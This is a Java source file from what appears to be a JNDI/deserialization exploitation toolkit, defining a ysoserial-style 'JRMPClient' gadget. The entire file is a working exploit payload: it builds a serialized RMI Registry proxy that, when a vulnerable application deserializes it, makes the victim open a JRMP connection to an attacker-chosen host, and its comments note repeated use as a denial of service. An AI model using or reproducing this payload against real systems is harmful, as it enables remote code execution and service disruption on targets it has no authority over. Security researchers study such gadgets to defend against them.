package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Authors;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.lang.reflect.Proxy;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

/**
 * UnicastRef.newCall(RemoteObject, Operation[], int, long)
 * DGCImpl_Stub.dirty(ObjID[], long, Lease)
 * DGCClient$EndpointEntry.makeDirtyCall(Set<RefEntry>, long)
 * DGCClient$EndpointEntry.registerRefs(List<LiveRef>)
 * DGCClient.registerRefs(Endpoint, List<LiveRef>)
 * LiveRef.read(ObjectInput, boolean)
 * UnicastRef.readExternal(ObjectInput)
 * <p>
 * Thread.start()
 * DGCClient$EndpointEntry.<init>(Endpoint)
 * DGCClient$EndpointEntry.lookup(Endpoint)
 * DGCClient.registerRefs(Endpoint, List<LiveRef>)
 * LiveRef.read(ObjectInput, boolean)
 * UnicastRef.readExternal(ObjectInput)
 * <p>
 * Requires:
 * - JavaSE
 * <p>
 * Argument:
 * - host:port to connect to, host only chooses random port (DOS if repeated many times)
 * <p>
 * Yields:
 * * an established JRMP connection to the endpoint (if reachable)
 * * a connected RMI Registry proxy
 * * one system thread per endpoint (DOS)
 *
 * @author mbechler
 */
@SuppressWarnings({
        "restriction"
})
@Authors({Authors.MBECHLER})
public class JRMPClient implements ObjectPayload<Object> {

    public Object getObject(PayloadType type, String... param) throws Exception {
        String host;
        int    port;
        int    sep = param[0].indexOf(':');
        if (sep < 0) {
            port = new Random().nextInt(65535);
            host = param[0];
        } else {
            host = param[0].substring(0, sep);
            port = Integer.valueOf(param[0].substring(sep + 1));
        }
        ObjID                         id  = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint                   te  = new TCPEndpoint(host, port);
        UnicastRef                    ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[]{
                Registry.class
        }, obj);
        return proxy;
    }
}
